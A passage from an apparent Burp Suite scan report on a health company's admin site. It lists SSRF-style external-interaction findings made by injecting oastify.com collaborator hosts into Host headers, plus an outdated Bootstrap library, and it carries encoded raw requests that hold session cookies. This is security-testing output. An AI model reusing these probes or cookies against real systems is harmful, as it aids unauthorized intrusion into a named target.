Q=]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU3VuLCAxNSBEZWMgMjAyNCAwMDowMDo1MiBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDQ2NA0KU2V0LUNvb2tpZTogQVdTQUxCPTU0eEU5U1hCRWx5WmJPY2NKK2xRWWxIQ0Q5N1hkOUFuRnI1QzBLaW1rbEhsWVVYbm8xS1IrNEhrSW1vVkU0S0oyT05iY1RqUHd6V3Z4dVhwcXVIc2pWMnlkY1VFd0Q5TzM1eHZZRkh0QStHV2xJMjB3MmhJTlZRYmV2WDQ7IEV4cGlyZXM9U3VuLCAyMiBEZWMgMjAyNCAwMDowMDo1MiBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz01NHhFOVNYQkVseVpiT2NjSitsUVlsSENEOTdYZDlBbkZyNUMwS2lta2xIbFlVWG5vMUtSKzRIa0ltb1ZFNEtKMk9OYmNUalB3eld2eHVYcHF1SHNqVjJ5ZGNVRXdEOU8zNXh2WUZIdEErR1dsSTIwdzJoSU5WUWJldlg0OyBFeHBpcmVzPVN1biwgMjIgRGVjIDIwMjQgMDA6MDA6NTIgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+TWlyYWRvciBJbnNpZ2h0czwvdGl0bGU+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJNaXJhZG9yIEhlYWx0aCI+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIiAvPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9mYXZpY29uLmljbyIvPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3NlbGVjdDIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRlcmFuZ2VwaWNrZXIuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnRhd2Vzb21lLWZyZWUtYWxsLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZGF0YVRhYmxlcy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2J1dHRvbnMuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYWRtaW5sdGUubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8c2NyaXB0PnZhciBhY3RpdmVUaGVtZSA9ICdsaWdodCc8L3NjcmlwdD4gICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi1saWdodC5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9udHMvc3R5bGVzaGVldC5jc3MiPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICJzY3JlZW5XaWR0aD0iK3NjcmVlbi53aWR0aCsiOzMwO3BhdGg9LyI7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tYm94Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWxvZ28iIHN0eWxlPSJtYXJnaW4tdG9wOiAwLjZyZW07Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0idy03NSIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9taXJhZG9yX2luc2lnaHRzX2xvZ28ucG5nIiAvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJsb2dpbi1ib3gtbXNnIj5Gb3Jnb3QgUGFzc3dvcmQ8L3A+CgogICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcmdvdFBhc3N3b3JkIiBuYW1lPSJmb3Jnb3RQYXNzd29yZCIgY2xhc3M9Im1iLTAiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVtYWlsRXJyIiBjbGFzcz0iaW52YWxpZC1mZWVkYmFjayBkLWJsb2NrIj5FbWFpbCBkb2VzIG5vdCBleGlzdC48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtYmxvY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iRW1haWwiIHZhbHVlPSJ0YmhCQlBLdEBidXJwY29sbGFib3JhdG9yLm5ldCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iZmFzIGZhLWVudmVsb3BlIj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgcm93LWVxLWhlaWdodCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTgiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggaC0xMDAgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vbG9naW4iPkJhY2sgdG8gbG9naW48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC00Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iZm9yZ290UGFzc3dvcmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tYmxvY2siPlN1Ym1pdDwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vanMvdmFsaWRhdGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPHNjcmlwdD4KICAgICAgICBmdW5jdGlvbiB2YWxpZGF0ZUZvcmdvdFBhc3N3b3JkKCkgewogICAgICAgICAgICB2YXIgZW1haWxFcnIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZW1haWxFcnIiKTsKICAgICAgICAgICAgdmFyIGVtYWlsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsIikudmFsdWUudHJpbSgpOwogICAgICAgICAgICBlbWFpbEVyci5pbm5lckhUTUwgPSAnJzsKCiAgICAgICAgICAgIGlmICghdmFsaWRhdGVFbWFpbChlbWFpbCkpIHsKICAgICAgICAgICAgICAgIGVtYWlsRXJyLmlubmVySFRNTCA9ICdQbGVhc2UgZW50ZXIgdmFsaWQgZW1haWwgYWRkcmVzcy4nOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICA8L3NjcmlwdD4KICAgIDwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7394090249250956288</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/app.js]]></path>
    <location><![CDATA[/js/app.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>v3za9wubpsw6hqq3mai37275yw4qsoqcjb71urig.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHYzemE5d3VicHN3NmhxcTNtYWkzNzI3NXl3NHFzb3FjamI3MXVyaWcub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>178.128.64.126</originIp>
      <time>2024-Dec-15 00:58:42.041 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>v3za9wubpsw6hqq3mai37275yw4qsoqcjb71urig.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>373445863014021120</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/app.js]]></path>
    <location><![CDATA[/js/app.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>v3za9wubpsw6hqq3mai37275yw4qsoqcjb71urig.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHYzemE5d3VicHN3NmhxcTNtYWkzNzI3NXl3NHFzb3FjamI3MXVyaWcub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:58:42.989 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHYzemE5d3VicHN3NmhxcTNtYWkzNzI3NXl3NHFzb3FjamI3MXVyaWcub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncXFnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1515415105070925824</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/bootstrap.bundle.min.js]]></path>
    <location><![CDATA[/js/bootstrap.bundle.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/1104.html">CWE-1104: Use of Unmaintained Third Party Components</a></li><li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9: Using Components with Known Vulnerabilities</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[<p>We observed a vulnerable JavaScript library.</p>
<p>We detected <strong>bootstrap</strong> version <strong>4.6.0</strong>, which has the following vulnerability:</p>
<ul>
<li>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6531">CVE-2024-6531</a>: Bootstrap Cross-Site Scripting (XSS) vulnerability<br>
</li>
</ul><br>
]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[bootstrap>.4.6.0]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpDb29raWU6IFBIUFNFU1NJRD1rYWo2MTBtMHJwZ3FxNGFpY3N1bWFnb2Y0czsgQVdTQUxCPXlITERqbFY0V0o2NUZCTFMrMEJ2YkRpdUc1VGJQY1VOK0thNVhyMDBWMEhTTVVKSlhDSVRwczBCTSt4dHV4ZU43dFVHZVJ5VXZZN29hQUhsWmVjaTNjM0RSaHhjZi91ZHNZdW9jZ2tONFBLTmF2dWlXVlJkdXJaM3NvUGM7IEFXU0FMQkNPUlM9eUhMRGpsVjRXSjY1RkJMUyswQnZiRGl1RzVUYlBjVU4rS2E1WHIwMFYwSFNNVUpKWENJVHBzMEJNK3h0dXhlTjd0VUdlUnlVdlk3b2FBSGxaZWNpM2MzRFJoeGNmL3Vkc1l1b2Nna040UEtOYXZ1aVdWUmR1clozc29QYw0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogbm8tY29ycw0KU2VjLUZldGNoLURlc3Q6IHNjcmlwdA0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KUHJpb3JpdHk6IHU9Mg0KDQo=]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6659824062276649984</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/bootstrap.bundle.min.js]]></path>
    <location><![CDATA[/js/bootstrap.bundle.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>kuiz0ll0ghnv8fhsdz9syryuplvfjed261urhh56.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGt1aXowbGwwZ2hudjhmaHNkejlzeXJ5dXBsdmZqZWQyNjF1cmhoNTYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 01:02:22.790 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>kuiz0ll0ghnv8fhsdz9syryuplvfjed261urhh56.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6708341827036339200</serialNumber>
